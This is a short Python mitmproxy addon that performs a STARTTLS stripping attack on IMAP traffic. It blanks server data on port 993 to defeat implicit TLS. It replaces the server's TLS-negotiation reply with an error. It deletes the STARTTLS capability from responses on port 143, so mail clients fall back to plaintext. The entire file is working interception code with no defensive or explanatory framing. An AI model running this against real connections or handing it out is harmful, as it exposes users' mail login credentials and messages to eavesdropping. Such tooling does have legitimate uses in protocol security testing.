from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re

class imap_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        
        if not msg.from_client:
            server_msg = bytearray(msg.content)
            if flow.server_conn.peername[1] == 993: # force client not to use implicit TLS
                server_msg = b''
                msg.content = server_msg

            if b'OK Begin TLS negotiation now' in server_msg:
                ctx.log.warn('client sends starttls')
                server_msg[0:] = b'BAD Error in IMAP command received by server.\r\n'
                msg.content = server_msg
            if b'STARTTLS' in server_msg and flow.server_conn.peername[1] == 143:
                position = server_msg.find(b'STARTTLS')
                ctx.log.warn(f"starttls in position {server_msg.find(b'STARTTLS')}")
                # remove the starttls
                server_msg[position:position+8+1] = b''
                msg.content = server_msg
            

addons = [imap_TCP()]